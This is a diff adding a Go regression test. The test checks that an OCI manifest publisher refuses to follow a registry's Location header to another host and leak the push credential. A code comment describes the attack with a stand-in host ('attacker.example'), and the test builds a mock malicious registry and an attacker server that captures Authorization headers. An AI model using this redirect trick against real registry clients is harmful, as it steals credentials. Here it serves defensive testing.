@@ -419,3 +419,56 @@ func TestAnUnnamedEnvironmentIsRefused(t *testing.T) {
 		t.Fatal("manifests were published for an unnamed environment")
 	}
 }
+
+// A registry may not name where the push credential goes.
+//
+// The token realm was hardened first, but it was not the only destination a
+// registry could choose: a blob upload answers with a Location header, and an
+// absolute Location was followed verbatim. So a registry could reply
+// `Location: http://attacker.example/hijacked`, answer the PUT with a 401, and
+// be handed the push robot's password -- in cleartext, on a host that never had
+// it, bypassing the realm constraint entirely. On a Bearer registry that is
+// strictly worse than it sounds: the registry itself never sees the Basic
+// credential, so this extracts one it could not otherwise read.
+func TestPublisherRefusesToSendCredentialsToAHostTheRegistryNamed(t *testing.T) {
+	t.Parallel()
+	var attackerSawAuthorization string
+	attacker := httptest.NewServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
+		if header := request.Header.Get("Authorization"); header != "" {
+			attackerSawAuthorization = header
+		}
+		writer.Header().Set("WWW-Authenticate", `Basic realm="registry"`)
+		writer.WriteHeader(http.StatusUnauthorized)
+	}))
+	defer attacker.Close()
+
+	registry := httptest.NewServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
+		switch {
+		case request.Method == http.MethodHead:
+			writer.WriteHeader(http.StatusNotFound)
+		case strings.HasSuffix(request.URL.Path, "/blobs/uploads/"):
+			// The whole attack, in one header.
+			writer.Header().Set("Location", attacker.URL+"/hijacked/upload")
+			writer.WriteHeader(http.StatusAccepted)
+		default:
+			writer.WriteHeader(http.StatusCreated)
+		}
+	}))
+	defer registry.Close()
+
+	host := strings.TrimPrefix(registry.URL, "http://")
+	publisher, err := ocipublish.New(host+"/team/manifests", registry.Client(), &recordingCredentials{}, true)
+	if err != nil {
+		t.Fatal(err)
+	}
+	err = publisher.Put(t.Context(), "prod", []byte("manifests"))
+	if err == nil {
+		t.Fatal("publishing followed the registry's Location to another host and reported success")
+	}
+	if attackerSawAuthorization != "" {
+		t.Fatalf("the push credential reached a host the registry named: %q", attackerSawAuthorization)
+	}
+	if !strings.Contains(err.Error(), "another host") {
+		t.Fatalf("error does not explain the refusal: %v", err)
+	}
+}
